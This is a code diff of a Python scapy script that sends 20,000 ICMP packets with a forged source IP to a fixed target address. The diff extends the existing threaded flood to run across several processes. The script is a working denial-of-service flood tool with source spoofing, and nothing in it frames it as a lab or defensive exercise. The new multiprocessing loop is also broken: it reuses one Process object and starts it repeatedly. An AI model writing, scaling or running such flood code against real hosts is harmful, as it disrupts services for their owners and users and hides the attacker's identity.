@@ -2,11 +2,15 @@ import sys
 import threading
 from queue import Queue
 from scapy.all import *
+from queue import Queue
+import multiprocessing
+
+no_of_process = 5
 
 
 def launch():
-        p = (IP(src="35.202.52.252", dst="35.193.17.254") / ICMP())
-        send(p, count=20000)
+    p = (IP(src="35.202.52.252", dst="35.193.17.254") / ICMP())
+    send(p, count=20000)
 
 
 NUMBER_OF_WORKERS = 10
@@ -34,7 +38,15 @@ def worker():
         q.task_done()  # when task is complete
 
 
-create_thread()
-create_jobs()
-worker()
+def run():
+    create_thread()
+    create_jobs()
+    worker()
 
+
+for i in range(0, no_of_process):
+    process = multiprocessing.Process(target=run, )
+
+for i in range (0,no_of_process):
+    process.start()
+    process.join()
